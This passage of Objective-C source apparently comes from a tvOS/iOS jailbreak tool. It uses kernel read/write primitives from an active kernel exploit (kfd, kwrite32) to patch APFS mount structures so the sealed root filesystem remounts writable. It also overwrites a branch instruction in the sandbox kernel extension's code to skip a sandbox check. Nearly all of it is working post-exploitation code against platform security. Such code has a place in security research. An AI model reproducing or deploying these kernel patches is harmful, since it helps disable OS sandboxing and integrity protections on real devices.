        snap.nxsb_writable_set = true;
    dt_build47_statfs_stage("post-step6", "/", log);

    int r7 = dt_build43_patch_vol_sb_q48(mount_apfs, log);
    if (r7 != 0) {
        ret = r7;
        goto rollback;
    }
    if (snap.vol_sb_ptr && !dt_build43_vol_q48_ida_allowed(snap.vol_sb_q48_orig))
        snap.vol_sb_q48_cleared = true;
    dt_build47_statfs_stage("post-step7", "/", log);

    int r8pre = dt_build47_rearm_apfs_readonly(mount_apfs, log);
    if (r8pre != 0) {
        ret = r8pre;
        goto rollback;
    }

    int r8gates = dt_build47_patch_mount_mp_gates(chain.mount_mp, "step8 pre", log);
    if (r8gates != 0) {
        ret = r8gates;
        goto rollback;
    }

    int r8 = dt_build47_mount_jumptable_mnt_update("/", log);
    dt_build47_statfs_stage("post-step8", "/", log);
    dt_build62_log_post_step8(&graph, log);
    if (r8 != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build62 step8 fail errno=%d — skip root probe", r8]];
        ret = r8;
        goto rollback;
    }

    dt_build42_deep_discovery_for_apfs(mount_apfs, graph.container, "post-step8", log);

    if (dt_build36_kern_kptr_valid(graph.mnt_outer, 0))
        graph.vol_sb_outer = dt_build38_read_u64_dual(graph.mnt_outer + DT_BAKED_APFS_VOL_SB,
            "build81 outer+0xC0 post-step8", log);

    if (graph.os_update)
        dt_build78_log_osupdate_post_step8_health(&graph, log);

    uint32_t post_ro = dt_build38_read_u32_dual(mount_apfs + DT_BAKED_APFS_READONLY, "outer+0x2B4-final", log);
    uint64_t post_rx = dt_build38_read_u64_dual(mount_apfs + DT_BAKED_APFS_REVERT_XID, "outer+0xF8-final", log);
    DTPhysLog(log, @"[*] build47 post-patch outer apfs_readonly=%u revert_xid=0x%llx", post_ro, post_rx);

    (void)dt_build47_open_write_probe("/var/tmp", "baseline", log);

    if (graph.os_update) {
        if (!dt_build80_root_statfs_rw("post-case5", log)) {
            DTPhysLog(log,
                @"[!] build80 os.update MNT_UPDATE OK but / still RDONLY — rollback "
                "(IDA apfs_mount_update @ 0x9da970)");
            [[DTRunLogger shared] logStage:@"build81 os.update MNT_UPDATE OK but statfs RDONLY"];
            ret = EROFS;
            goto rollback;
        }
        if (!dt_build77_remount_graph_nx_complete(&graph, log)) {
            DTPhysLog(log,
                @"[!] build77 os.update MNT_UPDATE OK but container+0xC8 invalid — rollback "
                "(IDA nx_rw_update LDR @ 0x987978 → nxsb+0x4F4 @ 0x98797c)");
            [[DTRunLogger shared] logStage:@"build77 os.update remount C8 gate fail"];
            ret = DT_BUILD47_ERR_GRAPH_INCOMPLETE;
            goto rollback;
        }
        DTPhysLog(log,
            @"[*] build77 os.update — MNT_UPDATE OK + statfs / RW + container+0xC8 heap "
            "(IDA @ 0x9da970 + 0x987978)");
        [[DTRunLogger shared] logStage:@"build77 os.update remount OK statfs+nx"];
        int r88 = dt_build88_restore_mnt_rootfs_for_amfi(chain.mount_mp, "post-remount", log);
        if (r88 != 0) {
            ret = r88;
            goto rollback;
        }
        snap_active = false;
        DTPhysLog(log, @"[+] build77 os.update staged remount complete — patches left applied");
        [[DTRunLogger shared] logStage:@"build77 os.update remount OK"];
        dt_build76_log_test_report(&graph, "OK", log);
        return 0;
    }

    int root_wr = dt_build47_open_write_probe("/", "root", log);
    if (root_wr != 0) {
        ret = -8;
        goto rollback;
    }

    int r88 = dt_build88_restore_mnt_rootfs_for_amfi(chain.mount_mp, "post-remount", log);
    if (r88 != 0) {
        ret = r88;
        goto rollback;
    }

    snap_active = false;
    DTPhysLog(log, @"[+] build47 staged remount complete — / write OK");
    return 0;

rollback:
    if (snap_active)
        dt_build63_remount_snap_restore(&snap, log);
    return ret;
}

int dt_build_remount_smoke(void (^log)(NSString *line))
{
    g_dt_rootful_remount_ok = false;

    if (getuid() != 0) {
        [[DTRunLogger shared] logStage:@"build47 failed need root"];
        return -1;
    }

    [[DTRunLogger shared] logStage:@"build47 discovery begin"];
    dt_build38_statfs_log("/", log);
    dt_build38_statfs_log("/var/tmp", log);

    int dr = dt_build38_apfs_discovery(log);
    if (dr != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 discovery fail %d", dr]];
        DTPhysLog(log, @"[!] build47 discovery failed (%d)", dr);
        return dr;
    }

    [[DTRunLogger shared] logStage:@"build47 staged remount begin"];
    int pr = dt_build47_staged_remount(log);
    if (pr == DT_BUILD47_ERR_GRAPH_INCOMPLETE) {
        [[DTRunLogger shared] logStage:@"build76 remount N/A graph incomplete"];
        DTPhysLog(log, @"[!] build76 rootful remount N/A on this boot (graph incomplete %d) — see [build76 TEST] line", pr);
        return pr;
    }
    if (pr != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 staged remount fail %d", pr]];
        DTPhysLog(log, @"[!] build47 staged remount failed (%d)", pr);
        return pr;
    }

    g_dt_rootful_remount_ok = true;
    [[DTRunLogger shared] logStage:@"build47 remount smoke OK"];
    return 0;
}

/// IDA: com.apple.security.sandbox:__text @ 539C78 is r-x (perm_w=0). physwrite32 hangs here (build94).
/// kfd sem_open kwrite preserves the adjacent insn (kfd_kwrite32 reads where+4).
static int dt_build95_kwrite32_ktext(uint64_t va, uint32_t val, const char *tag, void (^log)(NSString *line))
{
    if (!dt_kernel_exploit_is_active()) {
        DTPhysLog(log, @"[!] build95 %s: kernel exploit not active — keep exploit open through G5", tag);
        [[DTRunLogger shared] logStage:@"build95 P1 fail exploit inactive"];
        return -10;
    }

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build95 %s kwrite begin", tag]];
    if (dt_kfd_is_active()) {
        DTPhysLog(log, @"[*] build95 %s kfd_kwrite32 va=0x%llx val=0x%08x (__text r-x, not physwrite)", tag, va, val);
        kfd_kwrite32(va, val);
    } else {
        DTPhysLog(log, @"[*] build95 %s kwrite32 va=0x%llx val=0x%08x (__text r-x, not physwrite)", tag, va, val);
        kwrite32(va, val);
    }

    uint32_t post_kfd = dt_kfd_is_active() ? kfd_kread32(va) : kread32(va);
    uint32_t post_kread = kread32(va);
    DTPhysLog(log, @"[*] build95 %s post_kfd=0x%08x post_kread=0x%08x want=0x%08x",
        tag, post_kfd, post_kread, val);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build95 %s post_kfd=0x%08x", tag, post_kfd]];

    if (post_kfd != val || post_kread != val) {
        DTPhysLog(log, @"[!] build95 %s verify failed want 0x%08x", tag, val);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build95 %s verify failed", tag]];
        return -6;
    }
    return 0;
}

int dt_build95_apply_sandbox_op129_p1(void (^log)(NSString *line))
{
    if (!g_dt_baked_offsets_active) {
        DTPhysLog(log, @"[!] build95 P1: baked tvOS offsets not active");
        return -1;
    }
    if (dt_phys_cred_require_ready(log) != 0)
        return -2;
    if (!dt_kernel_exploit_is_active()) {
        DTPhysLog(log, @"[!] build95 P1: kernel exploit must stay open through G5");
        [[DTRunLogger shared] logStage:@"build95 P1 fail exploit inactive"];
        return -10;
    }

    uint64_t slide = gSystemInfo.kernelConstant.slide;
    uint64_t va = slide + DT_BAKED_SANDBOX_OP129_BRANCH_UNSLID;
    uint32_t pre_kfd = dt_kfd_is_active() ? kfd_kread32(va) : kread32(va);
    uint32_t pre_kread = kread32(va);

    DTPhysLog(log,
        @"[*] build95 P1 IDA 539C78 va=0x%llx slide=0x%llx pre_kfd=0x%08x pre_kread=0x%08x expect_pre=0x%08x expect_post=0x%08x",
        va, slide, pre_kfd, pre_kread, (unsigned)DT_BAKED_SANDBOX_OP129_BRANCH_PRE,
        (unsigned)DT_BAKED_SANDBOX_OP129_BRANCH_P1);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build95 P1 pre=0x%08x", pre_kfd]];

    if (pre_kfd != pre_kread) {
        DTPhysLog(log, @"[!] build95 P1 pre_kfd != pre_kread (0x%08x vs 0x%08x)", pre_kfd, pre_kread);
        [[DTRunLogger shared] logStage:@"build95 P1 pre kfd/kread mismatch"];
        return -4;
    }

    uint32_t pre = pre_kfd;
    if (pre == DT_BAKED_SANDBOX_OP129_BRANCH_P1) {
        DTPhysLog(log, @"[*] build95 P1 already applied (post word at 539C78)");
        [[DTRunLogger shared] logStage:@"build95 P1 already applied"];
        return 0;
    }
    if (pre != DT_BAKED_SANDBOX_OP129_BRANCH_PRE) {
        DTPhysLog(log,
            @"[!] build95 P1 pre mismatch at 539C78 (got 0x%08x want 0x%08x) — abort spawn",
            pre, (unsigned)DT_BAKED_SANDBOX_OP129_BRANCH_PRE);
        [[DTRunLogger shared] logStage:@"build95 P1 pre mismatch abort"];
        return -3;
    }

    int wr = dt_build95_kwrite32_ktext(va, DT_BAKED_SANDBOX_OP129_BRANCH_P1, "P1 op129 branch", log);
    if (wr != 0) {
        [[DTRunLogger shared] logStage:@"build95 P1 kfd write failed"];
        return wr;
    }

    [[DTRunLogger shared] logStage:@"build95 P1 applied OK"];
    DTPhysLog(log, @"[+] build95 P1 applied — CBZ@539C78 → B@539C7C (skip op-129 BL@539D10)");
    return 0;
}
